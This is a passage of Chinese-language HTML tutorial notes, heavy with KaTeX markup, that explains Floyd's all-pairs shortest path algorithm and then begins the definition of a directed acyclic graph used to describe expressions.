mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 表示从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的路径长度，<code>k</code> 表示绕行第 <code>k</code> 个顶点的运算步骤。初始时，对于任意两个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，若它们之间存在边，则以此边上的权值作为它们之间的最短路径长度；若它们之间不存在有向边，则以 ∞ 作为它们之间的最短路径长度。以后逐步尝试在原路径中加入顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">(</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k(k = 0, 1, \dotsc, n - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 作为中间顶点。若增加中间顶点后，得到的路径比原来的路径长度减少了，则以此新路径代替原路径。</p>
<p><strong>算法描述如下</strong>：</p>
<p>定义一个 <code>n</code> 阶方阵序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">A^{(-1)}, A^{(0)}, \dotsc, A^{(n-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">0</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>，其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A^{(-1)}[i][j] = arcs[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">rcs</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>M</mi><mi>i</mi><mi>n</mi><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>+</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow></mrow><annotation encoding="application/x-tex">A^{(k)}[i][j] = Min{A^{(k-1)}[i][j], A^{(k-1)}[i][k] + A^{(k-1)}[k][j], k = 0, 1, \dotsc, n - 1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">in</span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A^{(0)}[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">0</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 是从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>、中间顶点是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最短路径的长度，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A^{(k)}[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 是从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>、中间顶点的序号不大于 <code>k</code> 的最短路径的长度。<code>Floyd</code> 算法是一个迭代的过程，每迭代一次，在从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的最短路径上就多考虑了一个顶点：经过 <code>n</code> 次迭代后，所得到的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A^{(n-1)}[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的最短路径长度，即方阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">A^{(n-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span> 中就保存了任意一对顶点之间的最短路径长度。</p>
</li>
</ol>
<h4> 有向无环图描述表达式</h4>
<p><strong>有向无环图</strong>：若一个有向图中不存在环，则称为 <strong>有向无环图</strong>，简称 DAG 图。</p>
